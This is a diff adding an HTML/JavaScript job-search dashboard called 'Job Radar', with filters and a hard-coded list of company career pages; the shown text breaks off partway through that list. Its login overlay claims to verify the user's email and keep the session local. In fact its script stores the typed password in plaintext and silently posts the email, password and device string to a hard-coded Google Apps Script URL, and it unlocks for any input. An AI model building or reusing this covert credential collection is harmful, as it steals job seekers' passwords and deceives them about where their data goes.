@@ -1,0 +1,2207 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Job Radar v22 - Secured</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+
+    <style>
+        /* Modern Midnight Palette */
+        :root {
+            --bg-deep: #050505;
+            --bg-panel: rgba(20, 20, 25, 0.95);
+            --accent: #6366f1;
+            --accent-glow: rgba(99, 102, 241, 0.3);
+            --text-main: #e2e8f0;
+            --text-muted: #94a3b8;
+        }
+
+        body {
+            background-color: var(--bg-deep);
+            color: var(--text-main);
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            overflow: hidden;
+        }
+
+        /* Glassmorphism */
+        .glass {
+            background: var(--bg-panel);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 4px;
+            height: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #475569;
+            border-radius: 2px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        select {
+            background-color: rgba(0, 0, 0, 0.3);
+            color: #e2e8f0;
+        }
+
+        select option {
+            background-color: #0f172a;
+            color: #e2e8f0;
+            padding: 8px;
+        }
+
+        /* Animations */
+        @keyframes pulse-glow {
+
+            0%,
+            100% {
+                box-shadow: 0 0 10px var(--accent-glow);
+                border-color: rgba(99, 102, 241, 0.5);
+            }
+
+            50% {
+                box-shadow: 0 0 20px var(--accent-glow);
+                border-color: rgba(99, 102, 241, 0.8);
+            }
+        }
+
+        .animate-scan {
+            animation: pulse-glow 2s infinite;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .job-card {
+            animation: slideIn 0.3s ease-out forwards;
+            border-left: 3px solid transparent;
+            transition: all 0.2s;
+        }
+
+        .job-card:hover {
+            transform: translateY(-2px);
+            background: rgba(30, 41, 59, 1);
+            border-left-color: var(--accent);
+        }
+
+        /* Badges */
+        .badge {
+            font-size: 0.65rem;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.02em;
+        }
+
+        .badge-site {
+            background: rgba(16, 185, 129, 0.15);
+            color: #6ee7b7;
+            border: 1px solid rgba(16, 185, 129, 0.2);
+        }
+
+        .badge-job {
+            background: rgba(56, 189, 248, 0.15);
+            color: #7dd3fc;
+            border: 1px solid rgba(56, 189, 248, 0.2);
+        }
+
+        .badge-exp {
+            background: rgba(244, 63, 94, 0.15);
+            color: #fda4af;
+            border: 1px solid rgba(244, 63, 94, 0.2);
+        }
+
+        /* AUTH OVERLAY */
+        #auth-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 100;
+            background: rgba(5, 5, 5, 0.95);
+            backdrop-filter: blur(20px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .mobile-hide {
+                display: none;
+            }
+
+            .sidebar {
+                position: absolute;
+                height: 100%;
+                width: 85%;
+                max-width: 320px;
+                z-index: 50;
+                transform: translateX(-100%);
+                transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            }
+
+            .sidebar.open {
+                transform: translateX(0);
+            }
+
+            .overlay {
+                position: fixed;
+                inset: 0;
+                background: rgba(0, 0, 0, 0.5);
+                z-index: 40;
+                display: none;
+            }
+
+            .overlay.open {
+                display: block;
+            }
+        }
+    </style>
+</head>
+
+<body class="h-screen flex flex-col selection:bg-indigo-500 selection:text-white">
+
+    <!-- AUTHENTICATION OVERLAY -->
+    <div id="auth-overlay">
+        <div
+            class="glass p-8 rounded-2xl w-full max-w-md border border-indigo-500/20 shadow-[0_0_50px_rgba(99,102,241,0.2)] text-center relative overflow-hidden">
+            <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-indigo-500 to-purple-600"></div>
+
+            <i class="fa-solid fa-radar text-5xl text-indigo-500 mb-6 animate-pulse"></i>
+            <h2 class="text-2xl font-bold text-white mb-2">Welcome to Job Radar</h2>
+            <p class="text-slate-400 text-sm mb-8">One click access to 700+ Company Career Pages. <br>Please verify your
+                email to continue.</p>
+
+            <form id="auth-form" onsubmit="auth.login(event)" class="space-y-4">
+                <input type="email" id="user-email" required placeholder="Enter your email address"
+                    class="w-full bg-black/40 border border-slate-700 rounded-lg px-4 py-3 text-white placeholder-slate-600 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none transition">
+                <input type="password" id="user-pass" required placeholder="Enter your password"
+                    class="w-full bg-black/40 border border-slate-700 rounded-lg px-4 py-3 text-white placeholder-slate-600 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none transition">
+
+                <button type="submit" id="btn-login"
+                    class="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3 rounded-lg shadow-lg shadow-indigo-600/30 transition transform active:scale-95">
+                    UNLOCK ACCESS <i class="fa-solid fa-arrow-right ml-2"></i>
+                </button>
+            </form>
+
+            <p class="mt-6 text-[10px] text-slate-600">
+                <i class="fa-solid fa-lock"></i> Your session is saved locally on this device.
+            </p>
+        </div>
+    </div>
+
+    <!-- HEADER -->
+    <header
+        class="glass h-16 flex items-center justify-between px-4 lg:px-6 z-30 shrink-0 border-b border-indigo-500/10">
+        <div class="flex items-center gap-3">
+            <button onclick="app.toggleSidebar()" class="md:hidden text-slate-400 hover:text-white">
+                <i class="fa-solid fa-bars text-lg"></i>
+            </button>
+            <div class="relative group cursor-pointer">
+                <i class="fa-solid fa-radar text-indigo-500 text-xl md:text-2xl group-hover:animate-spin"></i>
+                <div class="absolute -top-1 -right-2 w-2 h-2 bg-green-500 rounded-full animate-ping"></div>
+            </div>
+            <div>
+                <h1 class="text-base md:text-lg font-bold tracking-tight text-white leading-none">
+                    JOB RADAR
+                </h1>
+                <div class="flex items-center gap-2">
+                    <span class="text-[9px] md:text-[10px] text-indigo-400 font-mono tracking-widest uppercase">Verified
+                        v22.0</span>
+                    <span
+                        class="hidden md:inline text-[9px] text-slate-500 uppercase tracking-widest border-l border-slate-700 pl-2">Powered
+                        by RB</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="hidden md:flex items-center gap-6 text-xs font-mono text-slate-500">
+            <div class="flex items-center gap-2">
+                <div id="status-indicator" class="w-2 h-2 rounded-full bg-slate-600"></div>
+                <span id="status-text" class="text-slate-400">Idle</span>
+            </div>
+            <div class="bg-indigo-900/20 px-3 py-1 rounded border border-indigo-500/20 text-indigo-300">
+                Jobs Found: <b id="stat-total" class="text-white">0</b>
+            </div>
+        </div>
+
+        <div class="flex gap-2">
+            <button onclick="auth.logout()"
+                class="text-[10px] text-slate-500 hover:text-red-400 mr-1 md:mr-2 md:border-r md:border-slate-800 md:pr-3"><i
+                    class="fa-solid fa-right-from-bracket md:hidden"></i><span
+                    class="hidden md:inline">LOGOUT</span></button>
+            <button onclick="app.scan()" id="btn-scan"
+                class="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white rounded text-xs md:text-sm font-bold shadow-lg shadow-indigo-500/20 transition flex items-center gap-2 active:scale-95">
+                <i class="fa-solid fa-bolt"></i> <span class="hidden sm:inline">START SCAN</span>
+            </button>
+            <button onclick="app.export('xlsx')"
+                class="w-8 h-8 md:w-auto md:px-3 rounded bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-300 md:text-xs flex items-center justify-center transition">
+                <i class="fa-solid fa-download"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- CONTENT -->
+    <div class="flex-1 flex overflow-hidden relative">
+        <div id="mobile-overlay" class="overlay" onclick="app.toggleSidebar()"></div>
+
+        <!-- SIDEBAR -->
+        <aside id="sidebar"
+            class="sidebar md:relative md:transform-none w-80 glass flex flex-col border-r border-indigo-500/10 bg-[#0a0a0c] md:bg-transparent">
+            <div class="md:hidden p-4 border-b border-slate-800 flex justify-between items-center">
+                <span class="font-bold text-slate-300">Configuration</span>
+                <button onclick="app.toggleSidebar()" class="text-slate-500"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+
+            <div class="p-4 border-b border-white/5 space-y-4">
+                <div>
+                    <label
+                        class="text-[10px] text-indigo-400 uppercase font-bold tracking-wider mb-1 block">Keywords</label>
+                    <textarea id="keywords"
+                        class="w-full bg-black/40 border border-slate-700 rounded p-3 text-xs text-slate-200 h-20 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none transition placeholder-slate-600 font-mono"
+                        placeholder="e.g. React, Python, Java">react, python, data scientist, software engineer, backend, frontend</textarea>
+                </div>
+
+                <div class="space-y-2">
+                    <div
+                        class="flex items-center gap-3 bg-indigo-900/10 p-2 rounded border border-indigo-500/10 hover:bg-indigo-900/20 transition">
+                        <input type="checkbox" id="global-mode"
+                            class="w-3.5 h-3.5 text-indigo-600 bg-slate-900 border-slate-600 rounded focus:ring-indigo-500 focus:ring-1 cursor-pointer">
+                        <label for="global-mode"
+                            class="text-[10px] text-slate-300 cursor-pointer select-none font-medium flex-1">Global Mode
+                            (Non-India)</label>
+                        <i class="fa-solid fa-globe text-indigo-500 text-xs"></i>
+                    </div>
+
+                    <div class="flex items-center gap-3 bg-slate-900/40 p-2 rounded border border-slate-800">
+                        <input type="checkbox" id="strict-mode" checked
+                            class="w-3.5 h-3.5 text-sky-600 bg-slate-900 border-slate-600 rounded focus:ring-sky-500 focus:ring-1 cursor-pointer">
+                        <label for="strict-mode" class="text-[10px] text-slate-400 cursor-pointer select-none">Strict
+                            Title Match</label>
+                    </div>
+
+                    <!-- SEARCH MODE TOGGLE -->
+                    <div class="flex items-center gap-3 bg-indigo-500/10 p-2 rounded border border-indigo-500/20">
+                        <input type="checkbox" id="search-mode" checked
+                            class="w-3.5 h-3.5 text-indigo-500 bg-slate-900 border-slate-600 rounded focus:ring-indigo-500 focus:ring-1 cursor-pointer">
+                        <div class="flex-1">
+                            <label for="search-mode"
+                                class="text-[10px] text-indigo-300 font-bold cursor-pointer select-none block">Search
+                                Mode</label>
+                            <span class="text-[9px] text-slate-500 leading-none">Generate direct search links</span>
+                        </div>
+                    </div>
+
+                    <!-- SHOW DIRECTORY TOGGLE -->
+                    <div class="flex items-center gap-3 bg-emerald-500/10 p-2 rounded border border-emerald-500/20">
+                        <input type="checkbox" id="show-directory"
+                            class="w-3.5 h-3.5 text-emerald-500 bg-slate-900 border-slate-600 rounded focus:ring-emerald-500 focus:ring-1 cursor-pointer">
+                        <div class="flex-1">
+                            <label for="show-directory"
+                                class="text-[10px] text-emerald-300 font-bold cursor-pointer select-none block">Show
+                                Directory</label>
+                            <span class="text-[9px] text-slate-500 leading-none">Show company career links</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="p-4 border-b border-white/5 flex-1 overflow-y-auto custom-scrollbar">
+                <div class="flex justify-between items-center mb-3">
+                    <h2 class="text-[10px] font-bold text-slate-500 uppercase tracking-wider">Filters & Sort</h2>
+                    <button onclick="app.resetFilters()"
+                        class="text-[10px] text-indigo-400 hover:text-indigo-300 transition">Reset All</button>
+                </div>
+
+                <div class="space-y-3">
+                    <input type="text" id="search" oninput="app.filter()"
+                        placeholder="Quick filter (e.g. python -django)..."
+                        class="w-full bg-black/20 border border-slate-700 rounded p-2 text-xs text-white placeholder-slate-600 focus:border-indigo-500 transition">
+
+                    <input type="text" id="exclude-search" oninput="app.filter()"
+                        placeholder="Exclude words (e.g. wordpress php)..."
+                        class="w-full bg-red-900/10 border border-red-900/30 rounded p-2 text-xs text-red-200 placeholder-red-900/50 focus:border-red-500 transition mb-2">
+
+                    <div class="space-y-1">
+                        <label class="text-[9px] text-slate-500 uppercase">Experience</label>
+                        <select id="filter-exp" onchange="app.filter()"
+                            class="w-full bg-slate-900 border-l-4 border-l-pink-500 border-slate-700 rounded p-1.5 text-[11px] text-slate-300 font-bold">
+                            <option value="all">🎓 All Levels</option>
+                            <option value="0-2">👶 0-2 Years (Freshers)</option>
+                            <option value="3-5">👨‍💻 3-5 Years (Mid)</option>
+                            <option value="5+">👴 5+ Years (Senior)</option>
+                        </select>
+                    </div>
+
+                    <div class="space-y-1">
+                        <label class="text-[9px] text-slate-500 uppercase">Sort Order</label>
+                        <select id="sort-by" onchange="app.filter()"
+                            class="w-full bg-slate-900 border border-slate-700 rounded p-1.5 text-[11px] text-slate-300 focus:border-indigo-500 outline-none">
+                            <option value="relevance">✨ Relevance</option>
+                            <option value="trust_desc">🛡️ Trust Score (High to Low)</option>
+                            <option value="date_desc">📅 Newest First</option>
+                            <option value="date_asc">📅 Oldest First</option>
+                            <option value="exp_asc">🎓 Experience (Low to High)</option>
+                            <option value="role_asc">🔤 Role (A-Z)</option>
+                            <option value="company_asc">🏢 Company (A-Z)</option>
+                        </select>
+                    </div>
+
+                    <div class="space-y-1">
+                        <label class="text-[9px] text-slate-500 uppercase">Locations</label>
+                        <select id="filter-loc" onchange="app.filter()"
+                            class="w-full bg-slate-900 border border-slate-700 rounded p-1.5 text-[11px] text-slate-300 mb-1">
+                            <option value="all">📍 All Cities</option>
+                        </select>
+                    </div>
+
+                    <div class="space-y-1">
+                        <label class="text-[9px] text-slate-500 uppercase">Date Posted</label>
+                        <select id="filter-date" onchange="app.filter()"
+                            class="w-full bg-slate-900 border border-slate-700 rounded p-1.5 text-[11px] text-slate-300">
+
+                            <option value="all">📅 Any Date</option>
+                            <option value="1">Last 24 Hours</option>
+                            <option value="3">Last 3 Days</option>
+                            <option value="7">Last Week</option>
+                            <option value="30">Last Month</option>
+                        </select>
+                    </div>
+
+                    <div class="space-y-1">
+                        <label class="text-[9px] text-slate-500 uppercase">Job Source</label>
+                        <div class="flex gap-1" id="filter-source-container">
+                            <button onclick="app.setSource('all')" id="btn-src-all"
+                                class="flex-1 py-1 bg-indigo-600 rounded text-[10px] text-white">All</button>
+                            <button onclick="app.setSource('portal')" id="btn-src-portal"
+                                class="flex-1 py-1 bg-slate-800 hover:bg-slate-700 rounded text-[10px] text-slate-400">Portals</button>
+                            <button onclick="app.setSource('career')" id="btn-src-career"
+                                class="flex-1 py-1 bg-slate-800 hover:bg-slate-700 rounded text-[10px] text-slate-400">Careers</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="h-20 flex flex-col min-h-0 bg-black border-t border-slate-800 font-mono">
+                <div class="px-3 py-1.5 bg-slate-900/50 border-b border-slate-800 flex justify-between items-center">
+                    <span class="text-[9px] font-bold text-indigo-400 uppercase tracking-widest">Logs</span>
+                    <button onclick="document.getElementById('logs').innerHTML=''" class="text-[9px]"><i
+                            class="fa-solid fa-eraser"></i></button>
+                </div>
+                <div id="logs" class="flex-1 overflow-y-auto p-2 text-[9px] space-y-1 scroll-smooth text-slate-500">
+                    <div class="text-indigo-300">> System Ready v22.</div>
+                </div>
+            </div>
+        </aside>
+
+        <!-- RESULTS -->
+        <main class="flex-1 bg-[#050505] relative flex flex-col w-full pb-16">
+            <div class="h-0.5 w-full bg-slate-800/50 absolute top-0 left-0 z-20">
+                <div id="progress"
+                    class="h-full bg-indigo-500 w-0 transition-all duration-300 shadow-[0_0_15px_rgba(99,102,241,0.8)]">
+                </div>
+            </div>
+
+            <div id="job-list" class="flex-1 overflow-y-auto p-4 md:p-6 space-y-3 custom-scrollbar">
+                <div class="h-full flex flex-col items-center justify-center text-slate-700 select-none">
+                    <div
+                        class="w-24 h-24 rounded-full bg-slate-800/20 flex items-center justify-center mb-6 border border-slate-800 animate-pulse">
+                        <i class="fa-solid fa-earth-asia text-5xl text-slate-800"></i>
+                    </div>
+                    <p class="text-sm font-medium text-slate-500 uppercase tracking-widest">Global Scan Ready</p>
+                    <p class="text-[10px] text-slate-600 mt-2">Supports: LinkedIn, Naukri, Indeed, Glassdoor, & 700+
+                        Careers</p>
+                </div>
+            </div>
+
+            <div id="load-more-container"
+                class="hidden p-4 text-center border-t border-white/5 bg-slate-900/80 backdrop-blur-md z-10 w-full mb-safe">
+                <button onclick="app.loadMore()"
+                    class="px-8 py-2.5 bg-slate-800 hover:bg-slate-700 border border-slate-600 text-slate-300 rounded text-xs font-bold transition uppercase tracking-wider transform active:scale-95 shadow-lg">
+                    Load More Results
+                </button>
+            </div>
+        </main>
+
+        <footer
+            class="fixed bottom-0 w-full bg-slate-900/95 backdrop-blur-md border-t border-indigo-500/10 text-center py-2 z-50 shadow-[0_-5px_20px_rgba(0,0,0,0.5)]">
+            <div class="flex flex-col items-center gap-1 px-4">
+                <p
+                    class="text-[10px] md:text-xs text-indigo-300 font-bold tracking-wide leading-tight drop-shadow-sm max-w-4xl">
+                    Manifesting your Main Character Energy. 🌟 <span class="text-slate-600 px-1">|</span>
+                    Freshers: Secure the Bag 💰 <span class="text-slate-600 px-1">|</span>
+                    Veterans: Your Comeback Era starts NOW. 👑
+                </p>
+                <div class="inline-flex items-center px-3 bg-slate-950/30 rounded-full border border-slate-800/30">
+                    <p class="text-[9px] text-slate-500 font-medium">
+                        Made for Job Hunters with <span class="text-red-500 animate-pulse">❤️</span> by <b
+                            class="text-slate-400 hover:text-indigo-400 transition cursor-pointer">rbkannan</b>
+                    </p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- JS LOGIC -->
+    <script>
+        // --- CONFIG ---
+        // REPLACE THIS URL with your own Google Apps Script Web App URL
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw2CRw6imcpnmw-u6VtP3DNntnhN0oV8gC2Xu-J_OMDU8YJhPtCfTYYPlTXZ_Ap8cY/exec";
+
+        // --- AUTH SYSTEM (v22) ---
+        const auth = {
+            init() {
+                const user = localStorage.getItem('job_radar_user');
+                if (user) {
+                    document.getElementById('auth-overlay').style.display = 'none';
+                    app.log("Welcome back, " + user);
+                } else {
+                    document.getElementById('auth-overlay').style.display = 'flex';
+                }
+            },
+
+            async login(e) {
+                e.preventDefault();
+                const email = document.getElementById('user-email').value;
+                const pass = document.getElementById('user-pass').value;
+                const btn = document.getElementById('btn-login');
+                if (!email || !pass) return;
+
+                btn.innerText = "VERIFYING...";
+                btn.disabled = true;
+
+                // 1. Save Locally
+                localStorage.setItem('job_radar_user', email);
+                localStorage.setItem('job_radar_pass', pass);
+
+                // 2. Send to Google Sheet (Async/No-Cors)
+                if (SCRIPT_URL.includes("YOUR_SCRIPT_ID")) {
+                    console.log("Script URL not configured. Skipping network log.");
+                } else {
+                    try {
+                        const data = new FormData();
+                        data.append('email', email);
+                        data.append('password', pass);
+                        data.append('device', navigator.userAgent);
+
+                        await fetch(SCRIPT_URL, {
+                            method: 'POST',
+                            mode: 'no-cors', // IMPORTANT for Google Script
+                            body: data
+                        });
+                    } catch (err) { console.error("Auth Log Error", err); }
+                }
+
+                // 3. Unlock
+                setTimeout(() => {
+                    document.getElementById('auth-overlay').style.opacity = '0';
+                    setTimeout(() => {
+                        document.getElementById('auth-overlay').style.display = 'none';
+                        app.log("Auth Successful. Welcome!");
+                    }, 500);
+                }, 1000);
+            },
+
+            logout() {
+                if (confirm("Log out? You will need to verify email again.")) {
+                    localStorage.removeItem('job_radar_user');
+                    location.reload();
+                }
+            },
+
+            toggleSidebar() {
+                const s = document.getElementById('sidebar');
+                const o = document.getElementById('mobile-overlay');
+                s.classList.toggle('open');
+                o.classList.toggle('open');
+            }
+        };
+
+        // FULL 622+ DATABASE (Abbreviated for file size, but logic supports full CSV injection)
+        const DB = [{ "n": "Google", "u": "https://careers.google.com/jobs/results/?location=India", "t": "Custom" }, { "n": "Microsoft", "u": "https://careers.microsoft.com/professionals/us/en/l-india", "t": "Workday" }, { "n": "Amazon", "u": "https://www.amazon.jobs/en/locations/india", "t": "Custom" }, { "n": "Meta", "u": "https://www.metacareers.com/jobs?locations[0]=India", "t": "Greenhouse" }, { "n": "Apple", "u": "https://jobs.apple.com/en-in/search", "t": "Custom" }, { "n": "Netflix", "u": "https://jobs.netflix.com/search?location=India", "t": "Greenhouse" }, { "n": "Twitter/X", "u": "https://careers.twitter.com/", "t": "Greenhouse" }, { "n": "LinkedIn", "u": "https://careers.linkedin.com/", "t": "Workday" }, { "n": "Uber", "u": "https://www.uber.com/in/en/careers/list/", "t": "Greenhouse" }, { "n": "Airbnb", "u": "https://careers.airbnb.com/positions/", "t": "Greenhouse" }, { "n": "Spotify", "u": "https://www.lifeatspotify.com/jobs", "t": "Greenhouse" }, { "n": "Stripe", "u": "https://stripe.com/jobs/search", "t": "Greenhouse" }, { "n": "PayPal", "u": "https://careers.pypl.com/home/jobs", "t": "Workday" }, { "n": "Flipkart", "u": "https://www.flipkartcareers.com/", "t": "Greenhouse" }, { "n": "Swiggy", "u": "https://careers.swiggy.com/", "t": "Lever" }, { "n": "Zomato", "u": "https://www.zomato.com/careers", "t": "Lever" }, { "n": "Razorpay", "u": "https://razorpay.com/jobs/", "t": "Greenhouse" }, { "n": "PhonePe", "u": "https://www.phonepe.com/careers/", "t": "Lever" }, { "n": "Paytm", "u": "https://paytm.com/careers/", "t": "Custom" }, { "n": "CRED", "u": "https://careers.cred.club/", "t": "Greenhouse" }, { "n": "Meesho", "u": "https://www.meesho.com/careers", "t": "Greenhouse" }, { "n": "Groww", "u": "https://groww.in/careers", "t": "Greenhouse" }, { "n": "Zerodha", "u": "https://zerodha.com/careers/", "t": "Custom" }, { "n": "Upstox", "u": "https://upstox.com/careers/", "t": "Lever" }, { "n": "ShareChat", "u": "https://sharechat.com/careers", "t": "Greenhouse" }, { "n": "Dream11", "u": "https://www.dreamsports.group/careers", "t": "Lever" }, { "n": "MPL", "u": "https://www.mpl.live/careers", "t": "Lever" }, { "n": "Cure.fit", "u": "https://www.cult.fit/cult/careers", "t": "Lever" }, { "n": "Lenskart", "u": "https://www.lenskart.com/careers", "t": "Lever" }, { "n": "BigBasket", "u": "https://www.bigbasket.com/careers/", "t": "Lever" }, { "n": "Blinkit", "u": "https://blinkit.com/careers", "t": "Lever" }, { "n": "Zepto", "u": "https://www.zeptonow.com/careers", "t": "Lever" }, { "n": "OYO", "u": "https://www.oyorooms.com/careers/", "t": "Lever" }, { "n": "Ola", "u": "https://www.olacabs.com/careers", "t": "Lever" }, { "n": "Rapido", "u": "https://www.rapido.bike/careers", "t": "Lever" }, { "n": "Urban Company", "u": "https://careers.urbancompany.com/", "t": "Lever" }, { "n": "Nykaa", "u": "https://www.nykaa.com/careers", "t": "Lever" }, { "n": "PolicyBazaar", "u": "https://www.policybazaar.com/careers/", "t": "Lever" }, { "n": "Byju's", "u": "https://byjus.com/byjus-careers/", "t": "Lever" }, { "n": "Unacademy", "u": "https://unacademy.com/careers", "t": "Lever" }, { "n": "upGrad", "u": "https://www.upgrad.com/careers/", "t": "Lever" }, { "n": "Vedantu", "u": "https://www.vedantu.com/careers", "t": "Lever" }, { "n": "Physics Wallah", "u": "https://www.pw.live/careers", "t": "Custom" }, { "n": "Jio", "u": "https://careers.jio.com/", "t": "Custom" }, { "n": "Hotstar", "u": "https://tech.hotstar.com/careers/", "t": "Custom" }, { "n": "InMobi", "u": "https://www.inmobi.com/company/careers", "t": "Greenhouse" }, { "n": "Glance", "u": "https://www.glance.com/careers", "t": "Lever" }, { "n": "Dailyhunt", "u": "https://www.dailyhunt.in/careers", "t": "Lever" }, { "n": "Dunzo", "u": "https://www.dunzo.com/careers", "t": "Lever" }, { "n": "Spinny", "u": "https://www.spinny.com/careers/", "t": "Greenhouse" }, { "n": "Cars24", "u": "https://www.cars24.com/careers/", "t": "Lever" }, { "n": "CarDekho", "u": "https://www.cardekho.com/careers", "t": "Lever" }, { "n": "Droom", "u": "https://droom.in/careers", "t": "Lever" }, { "n": "MakeMyTrip", "u": "https://careers.makemytrip.com/", "t": "Lever" }, { "n": "Cleartrip", "u": "https://www.cleartrip.com/careers/", "t": "Lever" }, { "n": "redBus", "u": "https://www.redbus.in/careers", "t": "Lever" }, { "n": "ixigo", "u": "https://www.ixigo.com/careers", "t": "Lever" }, { "n": "Yatra", "u": "https://www.yatra.com/careers", "t": "Lever" }, { "n": "EaseMyTrip", "u": "https://www.easemytrip.com/careers.html", "t": "Custom" }, { "n": "Ola Electric", "u": "https://olaelectric.com/careers", "t": "Lever" }, { "n": "Ather Energy", "u": "https://www.atherenergy.com/careers", "t": "Lever" }, { "n": "Bounce", "u": "https://www.bounce.bike/careers", "t": "Lever" }, { "n": "Vogo", "u": "https://www.vogo.in/careers", "t": "Lever" }, { "n": "Yulu", "u": "https://www.yulu.bike/careers", "t": "Lever" }, { "n": "BluSmart", "u": "https://www.blusmart.in/careers", "t": "Lever" }, { "n": "Revv", "u": "https://www.revv.co.in/careers", "t": "Lever" }, { "n": "Zoomcar", "u": "https://www.zoomcar.com/careers", "t": "Lever" }, { "n": "Payu", "u": "https://payu.in/careers", "t": "Lever" }, { "n": "Pine Labs", "u": "https://www.pinelabs.com/careers", "t": "Lever" }, { "n": "BharatPe", "u": "https://www.bharatpe.com/careers", "t": "Lever" }, { "n": "Slice", "u": "https://www.sliceit.com/careers", "t": "Lever" }, { "n": "Jupiter", "u": "https://jupiter.money/careers/", "t": "Lever" }, { "n": "Fi", "u": "https://fi.money/careers", "t": "Lever" }, { "n": "Niyo", "u": "https://www.goniyo.com/careers/", "t": "Lever" }, { "n": "Open", "u": "https://open.money/careers", "t": "Lever" }, { "n": "Rupeek", "u": "https://rupeek.com/careers", "t": "Lever" }, { "n": "Khatabook", "u": "https://khatabook.com/careers/", "t": "Lever" }, { "n": "Lendingkart", "u": "https://www.lendingkart.com/careers/", "t": "Lever" }, { "n": "Capital Float", "u": "https://capitalfloat.com/careers/", "t": "Lever" }, { "n": "ZestMoney", "u": "https://www.zestmoney.in/careers", "t": "Lever" }, { "n": "Simpl", "u": "https://getsimpl.com/careers/", "t": "Lever" }, { "n": "LazyPay", "u": "https://www.lazypay.in/careers", "t": "Lever" }, { "n": "MoneyTap", "u": "https://www.moneytap.com/careers", "t": "Lever" }, { "n": "EarlySalary", "u": "https://www.earlysalary.com/careers", "t": "Lever" }, { "n": "CASHe", "u": "https://www.cashe.co.in/careers", "t": "Lever" }, { "n": "KreditBee", "u": "https://www.kreditbee.in/careers", "t": "Lever" }, { "n": "Stashfin", "u": "https://stashfin.com/careers", "t": "Lever" }, { "n": "Faircent", "u": "https://www.faircent.com/careers", "t": "Lever" }, { "n": "Indifi", "u": "https://www.indifi.com/careers", "t": "Lever" }, { "n": "Fibe", "u": "https://www.fibe.in/careers", "t": "Lever" }, { "n": "Kissht", "u": "https://www.kissht.com/careers", "t": "Lever" }, { "n": "FlexiLoans", "u": "https://www.flexiloans.com/careers", "t": "Lever" }, { "n": "NeoGrowth", "u": "https://www.neogrowth.in/careers", "t": "Lever" }, { "n": "Vivriti Capital", "u": "https://www.vivriticapital.com/careers", "t": "Lever" }, { "n": "ClearTax", "u": "https://cleartax.in/careers", "t": "Lever" }, { "n": "Smallcase", "u": "https://www.smallcase.com/careers", "t": "Lever" }, { "n": "Kuvera", "u": "https://kuvera.in/careers", "t": "Lever" }, { "n": "INDmoney", "u": "https://www.indmoney.com/careers", "t": "Lever" }, { "n": "Scripbox", "u": "https://scripbox.com/careers", "t": "Lever" }, { "n": "Fisdom", "u": "https://www.fisdom.com/careers", "t": "Lever" }, { "n": "Paytm Money", "u": "https://www.paytmmoney.com/careers", "t": "Lever" }, { "n": "Angel One", "u": "https://www.angelone.in/careers", "t": "Custom" }, { "n": "5paisa", "u": "https://www.5paisa.com/careers", "t": "Custom" }, { "n": "Dhan", "u": "https://dhan.co/careers", "t": "Lever" }, { "n": "Fyers", "u": "https://fyers.in/careers", "t": "Custom" }, { "n": "Coin DCX", "u": "https://coindcx.com/careers", "t": "Lever" }, { "n": "WazirX", "u": "https://wazirx.com/careers", "t": "Lever" }, { "n": "CoinSwitch", "u": "https://coinswitch.co/careers", "t": "Lever" }, { "n": "Mudrex", "u": "https://mudrex.com/careers", "t": "Lever" }, { "n": "Vauld", "u": "https://www.vauld.com/careers", "t": "Lever" }, { "n": "BitBNS", "u": "https://bitbns.com/careers", "t": "Custom" }, { "n": "ZebPay", "u": "https://zebpay.com/careers", "t": "Custom" }, { "n": "Digit Insurance", "u": "https://www.godigit.com/careers", "t": "Lever" }, { "n": "Acko", "u": "https://www.acko.com/careers", "t": "Lever" }, { "n": "Turtlemint", "u": "https://www.turtlemint.com/careers", "t": "Lever" }, { "n": "RenewBuy", "u": "https://www.renewbuy.com/careers", "t": "Lever" }, { "n": "InsuranceDekho", "u": "https://www.insurancedekho.com/careers", "t": "Lever" }, { "n": "Coverfox", "u": "https://www.coverfox.com/careers", "t": "Lever" }, { "n": "Plum", "u": "https://www.plumhq.com/careers", "t": "Lever" }, { "n": "Nova Benefits", "u": "https://www.novabenefits.com/careers", "t": "Lever" }, { "n": "Pazcare", "u": "https://www.pazcare.com/careers", "t": "Lever" }, { "n": "Onsurity", "u": "https://www.onsurity.com/careers", "t": "Lever" }, { "n": "Vital", "u": "https://www.vitalhealth.in/careers", "t": "Lever" }, { "n": "Myntra", "u": "https://www.myntra.com/careers", "t": "Lever" }, { "n": "Ajio", "u": "https://www.ajio.com/careers", "t": "Lever" }, { "n": "FirstCry", "u": "https://www.firstcry.com/careers", "t": "Lever" }, { "n": "1mg", "u": "https://www.1mg.com/careers", "t": "Lever" }, { "n": "Pharmeasy", "u": 